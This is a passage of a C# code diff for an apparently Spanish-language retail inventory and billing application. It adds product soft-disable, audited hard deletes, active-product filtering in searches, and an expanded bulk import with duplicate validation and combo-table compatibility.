+                    using (var cmd = new SqlCommand("UPDATE Productos SET Activo=@act, FechaModificacion=GETDATE() WHERE ProductoID=@id", c))
+                    {
+                        cmd.Parameters.AddWithValue("@act", activo);
+                        cmd.Parameters.AddWithValue("@id", id);
+                        return cmd.ExecuteNonQuery() > 0;
+                    }
+                }
+            }
+            catch { return false; }
+        }
+
+        public static bool DeshabilitarProducto(int id) => CambiarActivoProducto(id, false);
+        public static bool RehabilitarProducto(int id) => CambiarActivoProducto(id, true);
+
+        public static bool EliminarProducto(int id)
+        {
+            // Borrado físico solo para usuario técnico (el cliente usa DeshabilitarProducto).
+            if (!SesionUsuario.EsUsuarioTecnico)
+            {
+                NotificarError("La eliminación definitiva solo está disponible para el usuario técnico.");
+                return false;
+            }
+            try
+            {
+                using (var c = new SqlConnection(_connectionString))
+                {
+                    c.Open();
+                    AsegurarMigracionLite(c);
                     using (var del = new SqlCommand("DELETE FROM Productos WHERE ProductoID=@id", c))
                     {
                         del.Parameters.AddWithValue("@id", id);
                         del.ExecuteNonQuery();
                     }
+                    RegistrarAccionTecnica("HARD_DELETE_PRODUCTO", "ProductoID=" + id);
                     return true;
                 }
             }
-            catch { return false; }
+            catch (Exception ex)
+            {
+                NotificarError("EliminarProducto: " + ex.Message);
+                return false;
+            }
         }
 
         public static int GetStockActualProducto(int productoId)
@@ -2576,7 +2949,8 @@ CostoIncluyeIva=@cii, FechaModificacion=GETDATE() WHERE ProductoID=@id", conexio
                     c.Open();
                     var dt = new DataTable();
                     string like = "%" + (q ?? "").Replace("[", "[[]").Replace("%", "[%]").Replace("_", "[_]") + "%";
-                    using (var cmd = new SqlCommand("SELECT TOP 1 * FROM Productos WHERE Codigo=@q OR CodigoBarra=@q OR Descripcion LIKE @qLike", c))
+                    AsegurarMigracionLite(c);
+                    using (var cmd = new SqlCommand("SELECT TOP 1 * FROM Productos WHERE ISNULL(Activo,1)=1 AND (Codigo=@q OR CodigoBarra=@q OR Descripcion LIKE @qLike)", c))
                     {
                         cmd.Parameters.AddWithValue("@q", q ?? "");
                         cmd.Parameters.AddWithValue("@qLike", like);
@@ -2599,6 +2973,7 @@ CostoIncluyeIva=@cii, FechaModificacion=GETDATE() WHERE ProductoID=@id", conexio
                 {
                     c.Open();
                     var dt = new DataTable();
+                    AsegurarMigracionLite(c);
                     using (var cmd = new SqlCommand("SELECT TOP 1 * FROM Productos WHERE Codigo = @cod", c))
                     {
                         cmd.Parameters.AddWithValue("@cod", codigo.Trim());
@@ -2623,7 +2998,8 @@ CostoIncluyeIva=@cii, FechaModificacion=GETDATE() WHERE ProductoID=@id", conexio
                     var dt = new DataTable();
                     // Sin filtrar stock: el lector debe encontrar el producto aunque el stock esté en 0
                     // (la validación de stock ocurre al confirmar la venta).
-                    using (var cmd = new SqlCommand("SELECT TOP 1 * FROM Productos WHERE (Codigo = @q OR CodigoBarra = @q)", c))
+                    AsegurarMigracionLite(c);
+                    using (var cmd = new SqlCommand("SELECT TOP 1 * FROM Productos WHERE ISNULL(Activo,1)=1 AND (Codigo = @q OR CodigoBarra = @q)", c))
                     {
                         cmd.Parameters.AddWithValue("@q", q);
                         new SqlDataAdapter(cmd).Fill(dt);
@@ -2644,7 +3020,8 @@ CostoIncluyeIva=@cii, FechaModificacion=GETDATE() WHERE ProductoID=@id", conexio
                 {
                     c.Open();
                     string like = "%" + (q ?? "").Replace("[", "[[]").Replace("%", "[%]").Replace("_", "[_]") + "%";
-                    using (var cmd = new SqlCommand("SELECT TOP 10 * FROM Productos WHERE (Codigo LIKE @p OR CodigoBarra LIKE @p OR Descripcion LIKE @p)", c))
+                    AsegurarMigracionLite(c);
+                    using (var cmd = new SqlCommand("SELECT TOP 10 * FROM Productos WHERE ISNULL(Activo,1)=1 AND (Codigo LIKE @p OR CodigoBarra LIKE @p OR Descripcion LIKE @p)", c))
                     {
                         cmd.Parameters.AddWithValue("@p", like);
                         new SqlDataAdapter(cmd).Fill(dt);
@@ -2664,7 +3041,8 @@ CostoIncluyeIva=@cii, FechaModificacion=GETDATE() WHERE ProductoID=@id", conexio
                 {
                     c.Open();
                     string like = "%" + (q ?? "").Replace("[", "[[]").Replace("%", "[%]").Replace("_", "[_]") + "%";
-                    using (var cmd = new SqlCommand("SELECT TOP 10 * FROM Productos WHERE Codigo LIKE @p OR CodigoBarra LIKE @p OR Descripcion LIKE @p", c))
+                    AsegurarMigracionLite(c);
+                    using (var cmd = new SqlCommand("SELECT TOP 10 * FROM Productos WHERE ISNULL(Activo,1)=1 AND (Codigo LIKE @p OR CodigoBarra LIKE @p OR Descripcion LIKE @p)", c))
                     {
                         cmd.Parameters.AddWithValue("@p", like);
                         new SqlDataAdapter(cmd).Fill(dt);
@@ -2726,12 +3104,33 @@ CostoIncluyeIva=@cii, FechaModificacion=GETDATE() WHERE ProductoID=@id", conexio
             public int NumeroFila { get; set; }
             public int? ProductoId { get; set; }
             public string Codigo { get; set; }
+            public string CodigoBarra { get; set; }
+            public string CodigoExterno { get; set; }
+            public string Descripcion { get; set; }
+            public string Categoria { get; set; }
+            public string SubRubro { get; set; }
+            public string Marca { get; set; }
+            public string Proveedor { get; set; }
+            public string TipoMoneda { get; set; }
             public decimal? CostoCompra { get; set; }
             public decimal? IvaPct { get; set; }
             public decimal? ImpuestoInterno { get; set; }
             public bool? CostoIncluyeIva { get; set; }
+            public decimal? Stock { get; set; }
+            public decimal? StockMinimo { get; set; }
+            public decimal? StockIdeal { get; set; }
+            public bool? PermitirModificarPrecioVenta { get; set; }
             public bool? EsStockeable { get; set; }
             public bool? VendeEnNegativo { get; set; }
+            public bool? UsaVariantes { get; set; }
+            public bool? EsCombo { get; set; }
+            public bool? Activo { get; set; }
+            public decimal? PrecioVenta { get; set; }
+            public string VarianteColor { get; set; }
+            public string VarianteTalle { get; set; }
+            public string VarianteUnidadMedida { get; set; }
+            public bool? CobraIvaAlCliente { get; set; }
+            public string ImagenPath { get; set; }
         }
 
         public class ProductoImportacionMasivaResultado
@@ -2756,13 +3155,33 @@ CostoIncluyeIva=@cii, FechaModificacion=GETDATE() WHERE ProductoID=@id", conexio
 SELECT
     p.ProductoID,
     ISNULL(p.Codigo, N'') AS Codigo,
-    ISNULL(p.Descripcion, N'') AS Nombre,
-    ISNULL(p.PrecioCosto, 0) AS [Costo de Compra],
+    ISNULL(p.CodigoBarra, N'') AS CodigoBarras,
+    ISNULL(p.CodigoExterno, N'') AS CodigoExterno,
+    ISNULL(p.Descripcion, N'') AS Descripcion,
+    ISNULL(p.Categoria, N'') AS Categoria,
+    ISNULL(p.SubRubro, N'') AS SubRubro,
+    ISNULL(p.Marca, N'') AS Marca,
+    ISNULL(p.Proveedor, N'') AS Proveedor,
+    CASE WHEN UPPER(LTRIM(RTRIM(ISNULL(p.TipoMoneda, N'')))) = N'USD' THEN N'USD' ELSE N'ARS' END AS TipoMoneda,
+    ISNULL(p.PrecioCosto, 0) AS CostoCompra,
     ISNULL(p.TipoIVA, N'21.0') AS TipoIVA,
-    ISNULL(p.ImpuestoInterno, 0) AS [Impuesto Interno],
+    ISNULL(p.ImpuestoInterno, 0) AS ImpuestoInterno,
     CASE WHEN ISNULL(p.CostoIncluyeIva, 0) = 1 THEN N'SI' ELSE N'NO' END AS CostoIncluyeIva,
+    ISNULL(p.StockActual, 0) AS Stock,
+    ISNULL(p.StockMinimo, 0) AS StockMinimo,
+    ISNULL(p.StockIdeal, 0) AS StockIdeal,
+    CASE WHEN ISNULL(p.PermiteModificarPrecioVenta, 0) = 1 THEN N'SI' ELSE N'NO' END AS PermitirModificarPrecioVenta,
     CASE WHEN ISNULL(p.EsStockeable, 1) = 1 THEN N'SI' ELSE N'NO' END AS EsStockeable,
-    CASE WHEN ISNULL(p.AceptaStockNegativo, 0) = 1 THEN N'SI' ELSE N'NO' END AS VendeEnNegativo
+    CASE WHEN ISNULL(p.AceptaStockNegativo, 0) = 1 THEN N'SI' ELSE N'NO' END AS PermitirStockNegativo,
+    CASE WHEN ISNULL(p.UsaVariantes, 0) = 1 THEN N'SI' ELSE N'NO' END AS UsaVariantes,
+    CASE WHEN ISNULL(p.EsCombo, 0) = 1 THEN N'SI' ELSE N'NO' END AS EsCombo,
+    CASE WHEN ISNULL(p.Activo, 1) = 1 THEN N'SI' ELSE N'NO' END AS Activo,
+    ISNULL(p.PrecioVenta, 0) AS PrecioVenta,
+    ISNULL(p.VarianteColor, N'') AS VarianteColor,
+    ISNULL(p.VarianteTalle, N'') AS VarianteTalle,
+    ISNULL(p.VarianteUnidadMedida, N'') AS VarianteUnidadMedida,
+    CASE WHEN ISNULL(p.CobraIvaAlCliente, 1) = 1 THEN N'SI' ELSE N'NO' END AS CobraIvaAlCliente,
+    ISNULL(p.ImagenPath, N'') AS ImagenPath
 FROM Productos p
 ORDER BY p.Descripcion";
                     new SqlDataAdapter(sql, c).Fill(dt);
@@ -2798,6 +3217,9 @@ ORDER BY p.Descripcion";
         }
 
         public static ProductoImportacionMasivaResultado ImportarActualizacionMasivaProductos(IList<ProductoActualizacionMasivaItem> filas)
+            => ImportarActualizacionMasivaProductos(filas, false);
+
+        public static ProductoImportacionMasivaResultado ImportarActualizacionMasivaProductos(IList<ProductoActualizacionMasivaItem> filas, bool permitirAltas)
         {
             var resultado = new ProductoImportacionMasivaResultado { Exitoso = false };
             if (filas == null || filas.Count == 0)
@@ -2816,8 +3238,9 @@ ORDER BY p.Descripcion";
                     {
                         try
                         {
+                            ValidarDuplicadosImportacionMasiva(c, tr, filas, permitirAltas);
                             foreach (var fila in filas)
-                                AplicarActualizacionMasivaFila(c, tr, fila, resultado);
+                                AplicarActualizacionMasivaFila(c, tr, fila, resultado, permitirAltas);
                             tr.Commit();
                             resultado.Exitoso = true;
                         }
@@ -2864,72 +3287,153 @@ ORDER BY p.Descripcion";
             return null;
         }
 
+        private static void ValidarDuplicadosImportacionMasiva(SqlConnection conexion, SqlTransaction transaccion, IList<ProductoActualizacionMasivaItem> filas, bool permitirAltas)
+        {
+            var errores = new List<string>();
+            var codigosArchivo = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
+            var barrasArchivo = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
+
+            foreach (var item in filas)
+            {
+                string codigo = (item.Codigo ?? "").Trim();
+                string barra = (item.CodigoBarra ?? "").Trim();
+
+                if (!string.IsNullOrWhiteSpace(codigo))
+                {
+                    if (codigosArchivo.TryGetValue(codigo, out int filaAnterior))
+                        errores.Add($"Filas {filaAnterior} y {item.NumeroFila}: Codigo duplicado '{codigo}' en el archivo.");
+                    else
+                        codigosArchivo[codigo] = item.NumeroFila;
+                }
+
+                if (!string.IsNullOrWhiteSpace(barra))
+                {
+                    if (barrasArchivo.TryGetValue(barra, out int filaAnterior))
+                        errores.Add($"Filas {filaAnterior} y {item.NumeroFila}: CodigoBarra duplicado '{barra}' en el archivo.");
+                    else
+                        barrasArchivo[barra] = item.NumeroFila;
+                }
+            }
+
+            foreach (var item in filas)
+            {
+                var prod = ResolverProductoImportacionMasiva(conexion, transaccion, item);
+                if (prod == null && !permitirAltas)
+                {
+                    string idTxt = item.ProductoId.HasValue ? item.ProductoId.Value.ToString() : "(vacio)";
+                    errores.Add($"Fila {item.NumeroFila}: No se encontro el producto (ProductoID={idTxt}, Codigo={item.Codigo ?? ""}).");
+                    continue;
+                }
+
+                int idExcluir = prod != null ? Convert.ToInt32(prod["ProductoID"]) : 0;
+                if (ExisteProductoDuplicadoEnConexion(conexion, transaccion, idExcluir, item.Codigo, item.CodigoBarra, out string msg))
+                    errores.Add($"Fila {item.NumeroFila}: {msg.Replace(Environment.NewLine, " | ")}");
+            }
+
+            if (errores.Count > 0)
+                throw new Exception("Conflictos detectados antes de importar:\n" + string.Join("\n", errores.Take(20)));
+        }
+
         private static void AplicarActualizacionMasivaFila(
             SqlConnection conexion,
             SqlTransaction transaccion,
             ProductoActualizacionMasivaItem item,
-            ProductoImportacionMasivaResultado resultado)
+            ProductoImportacionMasivaResultado resultado,
+            bool permitirAltas)
         {
             if (!item.ProductoId.HasValue && string.IsNullOrWhiteSpace(item.Codigo))
                 throw new Exception($"Fila {item.NumeroFila}: ProductoID o Codigo es obligatorio.");
 
             var prod = ResolverProductoImportacionMasiva(conexion, transaccion, item);
-            if (prod == null)
+            if (prod == null && !permitirAltas)
             {
                 string idTxt = item.ProductoId.HasValue ? item.ProductoId.Value.ToString() : "(vacío)";
                 throw new Exception($"Fila {item.NumeroFila}: No se encontró el producto (ProductoID={idTxt}, Codigo={item.Codigo ?? ""}).");
             }
 
-            int productoId = Convert.ToInt32(prod["ProductoID"]);
-            bool huboCambio = false;
+            bool esNuevo = prod == null;
+            int productoId = esNuevo ? 0 : Convert.ToInt32(prod["ProductoID"]);
 
-            bool esStockeableActual = !prod.Table.Columns.Contains("EsStockeable") || prod["EsStockeable"] == DBNull.Value || Convert.ToBoolean(prod["EsStockeable"]);
-            bool vendeNegActual = prod.Table.Columns.Contains("AceptaStockNegativo") && prod["AceptaStockNegativo"] != DBNull.Value && Convert.ToBoolean(prod["AceptaStockNegativo"]);
+            string codigo = ValorTexto(item.Codigo, prod, "Codigo");
+            string codigoBarra = ValorTexto(item.CodigoBarra, prod, "CodigoBarra");
+            string descripcion = ValorTexto(item.Descripcion, prod, "Descripcion");
+            if (string.IsNullOrWhiteSpace(codigo))
+                throw new Exception($"Fila {item.NumeroFila}: Codigo es obligatorio.");
+            if (string.IsNullOrWhiteSpace(descripcion))
+                throw new Exception($"Fila {item.NumeroFila}: Descripcion es obligatoria.");
 
-            bool esStockeableNuevo = item.EsStockeable ?? esStockeableActual;
-            bool vendeNegNuevo = item.VendeEnNegativo ?? vendeNegActual;
-            bool cambiaEstados = (item.EsStockeable.HasValue && esStockeableNuevo != esStockeableActual)
-                || (item.VendeEnNegativo.HasValue && vendeNegNuevo != vendeNegActual);
+            decimal costo = item.CostoCompra ?? ValorDecimal(prod, "PrecioCosto");
+            decimal venta = item.PrecioVenta ?? ValorDecimal(prod, "PrecioVenta");
+            decimal imp = item.ImpuestoInterno ?? ValorDecimal(prod, "ImpuestoInterno");
+            decimal iva = item.IvaPct ?? ParseIvaPct(ValorTexto(null, prod, "TipoIVA"));
+            int stock = Convert.ToInt32(item.Stock ?? ValorDecimal(prod, "StockActual"));
 
-            if (cambiaEstados)
-            {
-                using (var cmd = new SqlCommand(@"
-UPDATE Productos SET EsStockeable=@es, AceptaStockNegativo=@vn, FechaModificacion=GETDATE()
-WHERE ProductoID=@id", conexion, transaccion))
-                {
-                    cmd.Parameters.AddWithValue("@es", esStockeableNuevo);
-                    cmd.Parameters.AddWithValue("@vn", vendeNegNuevo);
-                    cmd.Parameters.AddWithValue("@id", productoId);
-                    cmd.ExecuteNonQuery();
-                }
-                huboCambio = true;
-            }
+            int guardado = GuardarProductoEnConexion(conexion, transaccion, productoId, codigo, codigoBarra, descripcion,
+                ValorTexto(item.Categoria, prod, "Categoria"),
+                ValorTexto(item.SubRubro, prod, "SubRubro"),
+                ValorTexto(item.Marca, prod, "Marca"),
+                ValorTexto(item.Proveedor, prod, "Proveedor"),
+                iva.ToString(CultureInfo.InvariantCulture),
+                costo,
+                0,
+                imp,
+                venta,
+                stock,
+                ValorTexto(item.ImagenPath, prod, "ImagenPath"),
+                NormalizarTipoMoneda(ValorTexto(item.TipoMoneda, prod, "TipoMoneda")),
+                item.PermitirModificarPrecioVenta ?? ValorBool(prod, "PermiteModificarPrecioVenta", false),
+                item.EsStockeable ?? ValorBool(prod, "EsStockeable", true),
+                item.VendeEnNegativo ?? ValorBool(prod, "AceptaStockNegativo", false),
+                item.UsaVariantes ?? ValorBool(prod, "UsaVariantes", false),
+                item.EsCombo ?? ValorBool(prod, "EsCombo", false),
+                item.StockMinimo ?? ValorNullableDecimal(prod, "StockMinimo"),
+                item.StockIdeal ?? ValorNullableDecimal(prod, "StockIdeal"),
+                ValorTexto(item.CodigoExterno, prod, "CodigoExterno"),
+                ValorTexto(item.VarianteColor, prod, "VarianteColor"),
+                ValorTexto(item.VarianteTalle, prod, "VarianteTalle"),
+                ValorTexto(item.VarianteUnidadMedida, prod, "VarianteUnidadMedida"),
+                item.CobraIvaAlCliente ?? ValorBool(prod, "CobraIvaAlCliente", true),
+                item.CostoIncluyeIva ?? ValorBool(prod, "CostoIncluyeIva", false),
+                item.Activo ?? ValorBool(prod, "Activo", true),
+                true);
 
-            decimal costoActual = prod["PrecioCosto"] != DBNull.Value ? Convert.ToDecimal(prod["PrecioCosto"]) : 0m;
-            decimal ivaActual = ParseIvaPct(prod["TipoIVA"]?.ToString());
-            decimal impActual = prod.Table.Columns.Contains("ImpuestoInterno") && prod["ImpuestoInterno"] != DBNull.Value
-                ? Convert.ToDecimal(prod["ImpuestoInterno"]) : 0m;
-            bool incluyeIva = prod.Table.Columns.Contains("CostoIncluyeIva") && prod["CostoIncluyeIva"] != DBNull.Value
-                && Convert.ToBoolean(prod["CostoIncluyeIva"]);
+            if (guardado <= 0)
+                throw new Exception($"Fila {item.NumeroFila}: No se pudo guardar el producto.");
 
-            decimal costoNuevo = item.CostoCompra ?? costoActual;
-            decimal ivaNuevo = item.IvaPct ?? ivaActual;
-            decimal impNuevo = item.ImpuestoInterno ?? impActual;
-            bool incluyeIvaNuevo = item.CostoIncluyeIva ?? incluyeIva;
+            if (esNuevo) resultado.Actualizados++;
+            else resultado.Actualizados++;
+        }
 
-            bool cambiaPrecios = (item.CostoCompra.HasValue && Math.Abs(costoNuevo - costoActual) >= 0.005m)
-                || (item.IvaPct.HasValue && Math.Abs(ivaNuevo - ivaActual) >= 0.005m)
-                || (item.ImpuestoInterno.HasValue && Math.Abs(impNuevo - impActual) >= 0.005m)
-                || (item.CostoIncluyeIva.HasValue && incluyeIvaNuevo != incluyeIva);
+        private static string ValorTexto(string valorImportado, DataRow actual, string columna)
+        {
+            if (valorImportado != null) return valorImportado.Trim();
+            if (actual == null || !actual.Table.Columns.Contains(columna) || actual[columna] == DBNull.Value) return "";
+            return actual[columna]?.ToString() ?? "";
+        }
 
-            if (cambiaPrecios)
-            {
-                ActualizarPreciosVentaPorCambioDeCosto(productoId, costoNuevo, incluyeIvaNuevo, ivaNuevo, impNuevo, conexion, transaccion);
-                huboCambio = true;
-            }
+        private static decimal ValorDecimal(DataRow actual, string columna)
+        {
+            if (actual == null || !actual.Table.Columns.Contains(columna) || actual[columna] == DBNull.Value) return 0m;
+            return Convert.ToDecimal(actual[columna]);
+        }
 
-            if (huboCambio) resultado.Actualizados++;
-            else resultado.SinCambios++;
+        private static decimal? ValorNullableDecimal(DataRow actual, string columna)
+        {
+            if (actual == null || !actual.Table.Columns.Contains(columna) || actual[columna] == DBNull.Value) return null;
+            return Convert.ToDecimal(actual[columna]);
+        }
+
+        private static bool ValorBool(DataRow actual, string columna, bool predeterminado)
+        {
+            if (actual == null || !actual.Table.Columns.Contains(columna) || actual[columna] == DBNull.Value) return predeterminado;
+            return Convert.ToBoolean(actual[columna]);
+        }
+
+        private static string NormalizarTipoMoneda(string tipoMoneda)
+        {
+            string t = (tipoMoneda ?? "").Trim().ToUpperInvariant();
+            if (t == "USD" || t == "DOLAR" || t == "DÓLAR") return "USD";
+            return "ARS";
         }
 
         public static int ObtenerIDProductoVarios()
@@ -3735,7 +4239,7 @@ WHERE f.FacturaID = @id", c);
                 {
                     c.Open();
                     using (var cmd = new SqlCommand(@"
-SELECT p.Codigo, p.Descripcion, fd.Cantidad, fd.PrecioUnitario,
+SELECT fd.ProductoID, p.Codigo, p.Descripcion, fd.Cantidad, fd.PrecioUnitario,
 (fd.Cantidad * fd.PrecioUnitario * (1 - ISNULL(fd.DescuentoPorcentaje,0)/100.0) * (1 + ISNULL(fd.RecargoPorcentaje,0)/100.0)) AS Subtotal
 FROM FacturaDetalle fd JOIN Productos p ON fd.ProductoID = p.ProductoID WHERE fd.FacturaID = @id", c))
                     {
@@ -5439,8 +5943,16 @@ UPDATE Configuracion SET LicenciaPayload = @v WHERE ID = 1;", c))
                 using (var c = new SqlConnection(_connectionString))
                 {
                     c.Open();
+                    AsegurarMigracionLite(c);
                     var dt = new DataTable();
-                    new SqlDataAdapter($"SELECT ComponenteID AS ProductoComponenteID, Cantidad FROM ProductoComboDetalle WHERE ProductoID={productoId}", c).Fill(dt);
+                    new SqlDataAdapter($@"
+SELECT ComponenteID AS ProductoComponenteID, Cantidad
+FROM ProductoComboDetalle
+WHERE ProductoID={productoId}
+UNION
+SELECT ProductoComponenteID, Cantidad
+FROM ProductoCombos
+WHERE ProductoPadreID={productoId}", c).Fill(dt);
                     foreach (DataRow r in dt.Rows)
                         list.Add(new ProductoComboItem { ProductoComponenteID = Convert.ToInt32(r[0]), Cantidad = Convert.ToDecimal(r[1]) });
                 }
@@ -5456,7 +5968,9 @@ UPDATE Configuracion SET LicenciaPayload = @v WHERE ID = 1;", c))
                 using (var c = new SqlConnection(_connectionString))
                 {
                     c.Open();
+                    AsegurarMigracionLite(c);
                     new SqlCommand($"DELETE FROM ProductoComboDetalle WHERE ProductoID={productoId}", c).ExecuteNonQuery();
+                    new SqlCommand($"DELETE FROM ProductoCombos WHERE ProductoPadreID={productoId}", c).ExecuteNonQuery();
                     foreach (var (componenteId, cantidad) in componentes)
                     {
                         var cmd = new SqlCommand("INSERT INTO ProductoComboDetalle (ProductoID,ComponenteID,Cantidad) VALUES (@pid,@cid,@cant)", c);
@@ -5464,6 +5978,11 @@ UPDATE Configuracion SET LicenciaPayload = @v WHERE ID = 1;", c))
                         cmd.Parameters.AddWithValue("@cid", componenteId);
                         cmd.Parameters.AddWithValue("@cant", cantidad);
                         cmd.ExecuteNonQuery();
+                        var cmdCompat = new SqlCommand("INSERT INTO ProductoCombos (ProductoPadreID,ProductoComponenteID,Cantidad) VALUES (@pid,@cid,@cant)", c);
+                        cmdCompat.Parameters.AddWithValue("@pid", productoId);
+                        cmdCompat.Parameters.AddWithValue("@cid", componenteId);
+                        cmdCompat.Parameters.AddWithValue("@cant", cantidad);
+                        cmdCompat.ExecuteNonQuery();
                     }
                 }
             }
@@ -5692,7 +6211,9 @@ UPDATE Configuracion SET LicenciaPayload = @v WHERE ID = 1;", c))
                     cmd.Parameters.AddWithValue("@t", tipo);
                     cmd.Parameters.AddWithValue("@f", DateTime.Now);
                     cmd.Parameters.AddWithValue("@m", monto);
-                    cmd.Parameters.AddWithValue("@d", descripcion ?? "");
+                    string desc = descripcion ?? "";
+                    if (desc.Length > 500) desc = desc.Substring(0, 500);
+                    cmd.Parameters.AddWithValue("@d", desc);
                     cmd.Parameters.AddWithValue("@nc", (object)numeroComprobante ?? DBNull.Value);
                     return Convert.ToInt32(cmd.ExecuteScalar());
                 }
